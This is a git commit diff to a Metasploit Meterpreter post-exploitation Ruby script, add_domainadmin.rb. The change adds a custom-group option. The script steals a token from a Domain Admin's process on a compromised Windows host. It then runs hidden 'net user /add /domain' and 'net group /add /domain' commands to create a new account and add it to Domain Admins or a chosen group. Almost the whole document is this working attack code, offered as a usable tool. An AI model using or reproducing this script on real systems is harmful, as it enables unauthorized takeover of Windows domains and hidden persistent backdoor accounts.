7fd47476090f7bc31029536314bce4462223d76e
VPB <vpbalint@gmail.com>
2010-12-29 15:17:24 +0100

    custom group support for add_domainadmin script

--- scripts/meterpreter/add_domainadmin.rb
+++ scripts/meterpreter/add_domainadmin.rb
@@ -2,10 +2,9 @@
 # Domain Admin is logged on the compromised system and we have 
 # sufficient privileges for token kidnapping
 #
-# Version: 0.1 - 2010.12.28. 02:36
-# by vpb 
+# by vpb https://github.com/v-p-b/MSF-Addons 
 
-def try_add(u,pwd)
+def try_add(u,pwd,g)
 	processes=client.sys.process.get_processes
 	sysinfo=client.sys.config.sysinfo
 	good_processes=Array.new
@@ -24,16 +23,15 @@ def try_add(u,pwd)
 			print_status("Token stolen: "+client.sys.config.steal_token(p))
 		
 			client.sys.process.execute("cmd /c net user #{u} #{pwd} /add /domain", nil, {'Hidden' => true, 'Channelized' => false, 'UseThreadToken'=>true})
-			client.sys.process.execute("cmd /c net group \"Domain Admins\" #{u} /add /domain", nil, {'Hidden' => true, 'Channelized' => false, 'UseThreadToken'=>true})
-			
-			chk=client.sys.process.execute("cmd /c net group \"Domain Admins\" /domain", nil, {'Hidden' => true, 'Channelized' => true, 'UseThreadToken'=>true})
+			client.sys.process.execute("cmd /c net group \"#{g}\" #{u} /add /domain", nil, {'Hidden' => true, 'Channelized' => false, 'UseThreadToken'=>true})
+			chk=client.sys.process.execute("cmd /c net group \"#{g}\" /domain", nil, {'Hidden' => true, 'Channelized' => true, 'UseThreadToken'=>true})
 			c_full=[]
 			while(c=chk.channel.read) do
 				c_full << c 
 			end
 
 			if (!c_full.join.match(/(.*) #{u} (.*)/).nil?) then
-				print_status("User #{u} added to the Domain Admins group!")
+				print_status("User #{u} added to the #{g} group!")
 				return
 			end
 		end
@@ -45,11 +43,14 @@ end
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h"	=>	[false, "Help menu"],
 	"-u"	=>	[true,"Name of the user to add"],
-	"-p"	=>	[true,"Password of the user to add"]
+	"-p"	=>	[true,"Password of the user to add"],
+	"-g"	=>	[true,"Group to add to (default: Domain Admins)"]
 )
 
 user=nil
 pass=nil
+group="Domain Admins"
+helpcall=nil
 
 # Parsing of Options
 @@exec_opts.parse(args) { |opt, idx, val|
@@ -58,9 +59,11 @@ pass=nil
 		user=val
 	when "-p"
 		pass=val	
+	when "-g"
+		group=val
   	when "-h"
     		print(
-      		"TODO Meterpreter Script\n" +
+      		"Add Domain Admin Meterpreter Script\n" +
       		"Usage:\n" +
         	@@exec_opts.usage
     		)
@@ -71,7 +74,7 @@ pass=nil
 
 if client.platform =~ /win32|win64/
         if user != nil && pass!=nil
-                try_add(user,pass)
+                try_add(user,pass,group)
         elsif helpcall == nil
                 print(
                         "TODO Meterpreter Script\n" +
@@ -80,7 +83,7 @@ if client.platform =~ /win32|win64/
         end
 
 else
-        print_error("This version of Meterpreter is not supported with this Script!")
+        print_error("This version of Meterpreter is not supported by this Script!")
         raise Rex::Script::Completed
 end
 
